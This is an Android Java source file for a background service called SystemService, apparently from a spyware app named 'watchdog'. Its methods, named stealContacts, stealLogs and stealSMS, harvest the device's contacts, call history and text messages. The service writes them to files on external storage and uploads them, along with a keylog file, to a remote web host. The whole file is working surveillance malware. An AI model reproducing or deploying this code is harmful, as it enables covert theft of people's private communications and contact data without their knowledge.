package com.sudy.watchdog;

import android.Manifest;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.support.annotation.IntDef;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.widget.Toast;

import net.gotev.uploadservice.MultipartUploadRequest;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Date;
import java.util.UUID;

/**
 * Created by sudy49730 on 07/04/2018.
 */

public class SystemService extends Service{
    String logFileName = "watchdog_keylogs.txt";
    String logFilePath = Environment.getExternalStorageDirectory() + "/watchdog/" + logFileName;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        File watchdog_dir=new File(Environment.getExternalStorageDirectory()+"/watchdog/");
        watchdog_dir.mkdirs();
        stealContacts();
        stealLogs();
        stealSMS();
        return super.onStartCommand(intent, flags, startId);
    }

    private void stealSMS() {
        StringBuilder sb=new StringBuilder();
        ContentResolver cr=getContentResolver();
        Cursor cursor=cr.query(Telephony.Sms.CONTENT_URI,null,null,null,null);
        while(cursor.moveToNext()){
            String SMS=cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
            String sender=cursor.getString(cursor.getColumnIndex(Telephony.Sms.CREATOR)).toString();
            sb.append("\nCreator: "+sender+"\nSMS: "+SMS+"\n-------------------------------");
        }
        String data=sb.toString();
        logSms("SMS\n"+data);
    }

    private void stealLogs() {
        StringBuilder sb = new StringBuilder();
        ContentResolver cr = getContentResolver();
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        while(cursor.moveToNext()){
            String number=cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            String duration=cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
            String date=cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
            String type=cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
            Date callDayTime = new Date(Long.valueOf(date));
            String dir = null;
            int dircode = Integer.parseInt(type);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append("\nNumber: "+number+"\nDuration"+duration+"\nDate: "+callDayTime+"\nType: "+dir+"\n-------------------------------");
        }
        String data=sb.toString();
        logCalls("CALL LOGS\n"+data);
    }

    private void stealContacts() {
        StringBuilder sb=new StringBuilder();
        ContentResolver cr=getContentResolver();
        Cursor cursor=cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);
        while(cursor.moveToNext()){
            String name=cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String number=cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)).toString();
            sb.append("\nName: "+name+"\nNumber: "+number+"\n-------------------------------");
        }
        String data=sb.toString();
        logContacts("CONTACTS\n"+data);
    }

    private void logContacts(String data) {
        String filename = "datalog_con.txt";
        String path = Environment.getExternalStorageDirectory() + "/watchdog/" + filename;
        File fp=new File(path);
        if(fp.exists()){
            try {
                FileOutputStream fos = new FileOutputStream(path);
                PrintStream printstream = new PrintStream(fos);
                printstream.print(data+"\n\n*****************************END**********************************\n");
                fos.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        else{
            try{
                fp.createNewFile();
                logContacts(data);
            }catch(Exception e){e.printStackTrace();}
        }
        uploadFile(path,filename);
    }
    private void logCalls(String data) {
        String filename = "datalog_c.txt";
        String path = Environment.getExternalStorageDirectory() + "/watchdog/" + filename;
        File fp=new File(path);
        if(fp.exists()){
            try {
                FileOutputStream fos = new FileOutputStream(path);
                PrintStream printstream = new PrintStream(fos);
                printstream.print(data+"\n\n*****************************END**********************************\n");
                fos.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        else{
            try{
                fp.createNewFile();
                logCalls(data);
            }catch(Exception e){e.printStackTrace();}
        }
        uploadFile(path,filename);
    }
    private void logSms(String data) {
        String filename = "datalog_s.txt";
        String path = Environment.getExternalStorageDirectory() + "/watchdog/" + filename;
        File fp=new File(path);
        if(fp.exists()){
            try {
                FileOutputStream fos = new FileOutputStream(path);
                PrintStream printstream = new PrintStream(fos);
                printstream.print(data+"\n\n*****************************END**********************************\n");
                fos.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        else{
            try{
                fp.createNewFile();
                logSms(data);
            }catch(Exception e){e.printStackTrace();}
        }
        uploadFile(path,filename);
        uploadFile(logFilePath,logFileName);
    }

    public void uploadFile(String path,String name) {
        //Uploading code
        try {
            String uploadId = UUID.randomUUID().toString();
            //Creating a multi part request
            new MultipartUploadRequest(this, uploadId,"https://celebal.000webhostapp.com/upload.php")
                    .addFileToUpload(path, "text") //Adding file
                    .addParameter("name", name) //Adding text parameter to the request
                    .setMaxRetries(2)
                    .startUpload(); //Starting the upload
        } catch (Exception exc) {
            Toast.makeText(this, exc.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
}